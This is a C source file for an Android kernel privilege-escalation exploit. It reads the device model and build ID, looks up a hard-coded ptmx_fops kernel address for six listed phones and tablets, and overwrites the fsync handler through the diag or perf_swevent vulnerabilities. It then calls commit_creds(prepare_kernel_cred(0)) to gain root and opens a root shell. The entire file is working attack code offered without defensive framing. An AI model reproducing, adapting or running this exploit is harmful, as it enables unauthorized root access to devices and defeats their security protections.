#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "cred.h"
#include "perf_swevent.h"
#include "libdiagexploit/diag.h"

typedef struct _supported_device {
  const char *device;
  const char *build_id;
  unsigned long int ptmx_fops_address;
} supported_device;

static supported_device supported_devices[] = {
  { "F-11D",            "V24R40A"   ,         0xc1056998 },
  { "URBANO PROGRESSO", "010.0.3000",         0xc0dc0a10 },
  { "SCL21",            "IMM76D.SCL21KDALJD", 0xc0c71dc0 },
  { "ISW13F",           "V69R51I",            0xc092e484 },
  { "IS17SH",           "01.00.04",           0xc0a407bc },
  { "Sony Tablet P",    "TISU0144",           0xc0671944 },
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static unsigned long int
get_ptmx_fops_address(void)
{
  int i;
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
      return supported_devices[i].ptmx_fops_address;
    }
  }

  printf("%s (%s) is not supported.\n", device, build_id);

  return 0;
}

void
obtain_root_privilege(void)
{
  commit_creds(prepare_kernel_cred(0));
}

static bool
run_obtain_root_privilege(void)
{
  int fd;

  fd = open("/dev/ptmx", O_WRONLY);
  fsync(fd);
  close(fd);

  return true;
}

static bool
attempt_perf_swevent_exploit(unsigned long int address)
{
  int number_of_children;

  number_of_children = perf_swevent_write_value_at_address(address, (unsigned long int)&obtain_root_privilege);
  if (number_of_children == 0) {
    while (true) {
      sleep(1);
    }
  }

  run_obtain_root_privilege();

  perf_swevent_reap_child_process(number_of_children);

  return true;
}

static bool
attempt_diag_exploit(unsigned long int address)
{
  struct diag_values injection_data;

  injection_data.address = address;
  injection_data.value = (uint16_t)&obtain_root_privilege;

  if (!diag_inject(&injection_data, 1)) {
    return false;
  }

  run_obtain_root_privilege();

  injection_data.value = 3;
  return diag_inject(&injection_data, 1);
}

int
main(int argc, char **argv)
{
  unsigned long int ptmx_fsync_address;
  unsigned long int ptmx_fops_address;
  int fd;
  bool success;

  if (!setup_creds_functions()) {
    printf("You need to manage to get prepare_kernel_cred and commit_creds addresses.\n");
    exit(EXIT_FAILURE);
  }

  ptmx_fops_address = get_ptmx_fops_address();
  if (!ptmx_fops_address) {
    exit(EXIT_FAILURE);
  }
  ptmx_fsync_address = ptmx_fops_address + 0x38;

  success = attempt_diag_exploit(ptmx_fsync_address);
  if (!success) {
    printf("\nAttempt perf_swevent exploit...\n");
    success = attempt_perf_swevent_exploit(ptmx_fsync_address);
  }

  if (getuid() != 0) {
    printf("Failed to obtain root privilege.\n");
    exit(EXIT_FAILURE);
  }

  system("/system/bin/sh");

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
